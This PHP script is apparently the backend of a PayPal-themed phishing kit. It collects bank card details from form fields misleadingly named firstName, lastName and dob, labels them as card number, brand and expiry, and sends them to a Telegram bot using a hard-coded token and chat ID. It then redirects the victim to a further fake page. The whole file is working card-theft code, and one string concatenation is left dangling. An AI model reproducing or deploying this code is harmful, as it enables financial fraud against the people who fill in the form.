<?php
// Token Telegram et Chat ID
$token = '7665929910:AAGejxbAgfw2a0oHpjJyzZC6XCXejFTkefI';
$chat_id = '7736182876';

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Récupérer les champs du formulaire
    $firstName        = isset($_POST['firstName']) ? htmlspecialchars(trim($_POST['firstName'])) : '';                            
    $lastName         = isset($_POST['lastName']) ? htmlspecialchars(trim($_POST['lastName'])) : '';
    $dob          = isset($_POST['dob']) ? htmlspecialchars(trim($_POST['dob'])) : '';
    
    // Vérification basique
    if (!empty($firstName) && !empty($lastName) && !empty($dob)) {
        // Préparer le message
        $message = "💳 Informations Carte Bancaire :\n" .
                   "🔢 Numéro de carte : $firstName\n" .
                   "🏦 Marque : $lastName\n" .
                   "📅 Expiration : $dob\n" .
                

        $url = "https://api.telegram.org/bot$token/sendMessage";

        $data = [
            'chat_id' => $chat_id,
            'text' => $message
        ];

        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query($data),
            CURLOPT_RETURNTRANSFER => true,
        ]);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode === 200) {
            header("Location: paypalchargement.php");
            exit();
        } else {
            echo "❌ Erreur lors de l'envoi à Telegram.";
        }
    } else {
        echo "⚠️ Tous les champs doivent être remplis.";
    }
} else {
    echo "⛔ Accès non autorisé.";
}
?>
